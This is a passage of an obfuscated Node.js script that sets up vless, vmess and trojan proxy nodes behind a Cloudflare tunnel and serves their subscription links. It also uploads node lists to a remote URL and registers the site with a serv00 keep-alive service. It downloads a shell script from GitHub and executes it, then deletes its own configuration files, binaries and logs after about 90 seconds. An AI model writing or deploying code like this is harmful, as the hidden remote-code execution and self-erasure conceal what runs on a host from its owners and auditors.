extractDomains();}catch(_0x1bdce2){console['error'](_0x252856(0x254)+'uting\x20comm'+'and:\x20'+_0x1bdce2);}}}catch(_0xfe952a){console['error']('Error\x20read'+_0x252856(0x1c3)+_0x252856(0x1a7),_0xfe952a);}async function _0xf46d18(_0x4a824a){const _0x5078fe=await getMetaInfo(),_0x2dcb87=NAME?NAME+'-'+_0x5078fe:_0x5078fe;return new Promise(_0x182293=>{setTimeout(()=>{const _0x5a7010=_0x6e63,_0x2b7cc7={'v':'2','ps':''+_0x2dcb87,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5a7010(0x1c8),'net':'ws','type':_0x5a7010(0x1c8),'host':_0x4a824a,'path':_0x5a7010(0x1df)+_0x5a7010(0x26f),'tls':_0x5a7010(0x186),'sni':_0x4a824a,'alpn':'','fp':_0x5a7010(0x236)},_0x1fbbcc='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+('?encryptio'+'n=none&sec'+_0x5a7010(0x19b)+'sni=')+_0x4a824a+('&fp=firefo'+'x&type=ws&'+'host=')+_0x4a824a+(_0x5a7010(0x246)+'less-argo%'+'3Fed%3D256'+'0#')+_0x2dcb87+('\x0a\x20\x20\x0avmess:'+'//')+Buffer['from'](JSON['stringify'](_0x2b7cc7))['toString']('base64')+(_0x5a7010(0x219)+_0x5a7010(0x1cb))+UUID+'@'+CFIP+':'+CFPORT+('?security='+'tls&sni=')+_0x4a824a+('&fp=firefo'+'x&type=ws&'+_0x5a7010(0x23a))+_0x4a824a+('&path=%2Ft'+'rojan-argo'+_0x5a7010(0x1a2)+'60#')+_0x2dcb87+_0x5a7010(0x1a4);console[_0x5a7010(0x1f2)](Buffer[_0x5a7010(0x1da)](_0x1fbbcc)['toString'](_0x5a7010(0x1d6))),fs['writeFileS'+'ync'](subPath,Buffer[_0x5a7010(0x1da)](_0x1fbbcc)[_0x5a7010(0x1b5)](_0x5a7010(0x1d6))),console[_0x5a7010(0x1f2)](FILE_PATH+('/sub.txt\x20s'+'aved\x20succe'+_0x5a7010(0x273))),uploadNodes(),app['get']('/'+SUB_PATH,(_0x590050,_0x498d6c)=>{const _0x38d5c8=_0x5a7010,_0x2cc41f=Buffer['from'](_0x1fbbcc)['toString'](_0x38d5c8(0x1d6));_0x498d6c['set'](_0x38d5c8(0x27e)+'pe',_0x38d5c8(0x24d)+';\x20charset='+_0x38d5c8(0x1f9)),_0x498d6c['send'](_0x2cc41f);}),_0x182293(_0x1fbbcc);},0x7d0);});}}async function uploadNodes(){const _0x115abe=_0x33c4c5;if(UPLOAD_URL&&PROJECT_URL){const _0x4c2c9d=PROJECT_URL+'/'+SUB_PATH,_0x4809ce={'subscription':[_0x4c2c9d]};try{const _0x5dd669=await axios[_0x115abe(0x208)](UPLOAD_URL+(_0x115abe(0x18b)+_0x115abe(0x1a1)+'ns'),_0x4809ce,{'headers':{'Content-Type':_0x115abe(0x281)+'n/json'}});return _0x5dd669&&_0x5dd669['status']===0xc8?(console[_0x115abe(0x1f2)](_0x115abe(0x22b)+'on\x20uploade'+_0x115abe(0x20b)+_0x115abe(0x22c)),_0x5dd669):null;}catch(_0x2fd711){if(_0x2fd711['response']){if(_0x2fd711['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x30e6a8=fs[_0x115abe(0x25c)+'nc'](listPath,'utf-8'),_0x1c312d=_0x30e6a8[_0x115abe(0x243)]('\x0a')[_0x115abe(0x1c5)](_0x1cf2ab=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x115abe(0x255)](_0x1cf2ab));if(_0x1c312d['length']===0x0)return;const _0x5748ed=JSON['stringify']({'nodes':_0x1c312d});try{const _0x39e3b7=await axios['post'](UPLOAD_URL+(_0x115abe(0x263)+_0x115abe(0x27f)),_0x5748ed,{'headers':{'Content-Type':'applicatio'+_0x115abe(0x1bf)}});return _0x39e3b7&&_0x39e3b7['status']===0xc8?(console['log']('Nodes\x20uplo'+'aded\x20succe'+'ssfully'),_0x39e3b7):null;}catch(_0x3b3b68){return null;}}else return;}}async function downloadAndRunMonitorScript(){const _0x1a6a1c=_0x33c4c5;try{console['log'](_0x1a6a1c(0x1d0)+_0x1a6a1c(0x252)+'\x20monitorin'+'g\x20script..'+'.'),await new Promise((_0xb91d0,_0x3630ea)=>{const _0x324a08=_0x1a6a1c;downloadFile(monitorScriptPath,'https://ra'+_0x324a08(0x242)+'ercontent.'+_0x324a08(0x230)+'lax/cf-vps'+'-monitor/m'+'ain/cf-vps'+'-monitor.s'+'h',_0x4dbec3=>{const _0x5166a6=_0x324a08;_0x4dbec3?(console[_0x5166a6(0x1ee)](_0x5166a6(0x261)+'download\x20m'+_0x5166a6(0x244)+'ipt:\x20'+_0x4dbec3),_0x3630ea(_0x4dbec3)):(console[_0x5166a6(0x1f2)](_0x5166a6(0x226)+'ript\x20downl'+_0x5166a6(0x1fe)+'essfully'),_0xb91d0());});}),fs[_0x1a6a1c(0x268)](monitorScriptPath,_0x1a6a1c(0x240)),console['log']('Monitor\x20sc'+'ript\x20permi'+_0x1a6a1c(0x215)+_0x1a6a1c(0x189));const _0x4fc86e='cd\x20'+FILE_PATH+(_0x1a6a1c(0x231)+'ps-monitor'+_0x1a6a1c(0x228))+MONITOR_KEY+'\x20-s\x20'+MONITOR_SERVER+'\x20-u\x20'+MONITOR_UPTIME_URL;console['log']('Running\x20mo'+_0x1a6a1c(0x1f1)+'pt\x20with\x20co'+'mmand:',_0x4fc86e);const {stdout:_0x2f1ce6,stderr:_0x38cfe8}=await exec(_0x4fc86e);_0x2f1ce6&&console['log']('Monitor\x20sc'+_0x1a6a1c(0x233)+'t:',_0x2f1ce6),_0x38cfe8&&console['error']('Monitor\x20sc'+'ript\x20error'+':',_0x38cfe8),console[_0x1a6a1c(0x1f2)]('Monitor\x20sc'+'ript\x20execu'+'ted\x20succes'+_0x1a6a1c(0x218));}catch(_0x10360b){console['error'](_0x1a6a1c(0x1be)+_0x1a6a1c(0x1ae)+_0x1a6a1c(0x1a6)+_0x1a6a1c(0x1ad),_0x10360b[_0x1a6a1c(0x198)]);}}function cleanFiles(){setTimeout(()=>{const _0x10f7aa=_0x6e63,_0x482db7=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x482db7['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x482db7['push'](phpPath);process[_0x10f7aa(0x25e)]===_0x10f7aa(0x1c1)?exec('del\x20/f\x20/q\x20'+_0x482db7['join']('\x20')+('\x20>\x20nul\x202>&'+'1'),_0x2a93d5=>{const _0xf2a90=_0x10f7aa;console[_0xf2a90(0x249)](),console['log'](_0xf2a90(0x1d8)+'ning'),console['log']('Thank\x20you\x20'+_0xf2a90(0x1f7)+'this\x20scrip'+'t,\x20enjoy!');}):exec(_0x10f7aa(0x235)+_0x482db7[_0x10f7aa(0x205)]('\x20')+('\x20>/dev/nul'+_0x10f7aa(0x27a)),_0x4bbc00=>{const _0x3dd1c4=_0x10f7aa;console[_0x3dd1c4(0x249)](),console['log'](_0x3dd1c4(0x1d8)+'ning'),console['log']('Thank\x20you\x20'+'for\x20using\x20'+'this\x20scrip'+'t,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xed11e3=_0x33c4c5;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xed11e3(0x1f2)](_0xed11e3(0x1e7)+_0xed11e3(0x288)+'matic\x20acce'+_0xed11e3(0x18e));return;}try{const _0x516288=await axios['post']('https://oo'+'oo.serv00.'+'net/add-ur'+'l',{'url':PROJECT_URL},{'headers':{'Content-Type':'applicatio'+'n/json'}});return console[_0xed11e3(0x1f2)](_0xed11e3(0x1c4)+_0xed11e3(0x253)+'k\x20added\x20su'+_0xed11e3(0x20d)),_0x516288;}catch(_0x4d4dd9){return console[_0xed11e3(0x1ee)](_0xed11e3(0x1ea)+_0xed11e3(0x220)+_0xed11e3(0x245)+'d:\x20'+_0x4d4dd9['message']),null;}}async function startserver(){const _0x42da4d=_0x33c4c5;try{console[_0x42da4d(0x1f2)]('Starting\x20s'+'erver\x20init'+'ialization'+'...'),deleteNodes(),cleanupOldFiles(),argoType(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask(),await downloadAndRunMonitorScript(),console['log']('Server\x20ini'+_0x42da4d(0x1f5)+'n\x20complete'+'d\x20successf'+'ully');}catch(_0x4f8a46){console[_0x42da4d(0x1ee)]('Error\x20in\x20s'+_0x42da4d(0x26a)+':',_0x4f8a46);}}app['listen'](PORT,()=>console[_0x33c4c5(0x1f2)]('HTTP\x20servi'+'ce\x20is\x20runn'+'ing\x20on\x20int'+_0x33c4c5(0x200)+':'+PORT+'!')),startserver()[_0x33c4c5(0x241)](_0x2dd9a1=>{const _0x35c446=_0x33c4c5;console['error']('Unhandled\x20'+_0x35c446(0x1b4)+'tartserver'+':',_0x2dd9a1);});
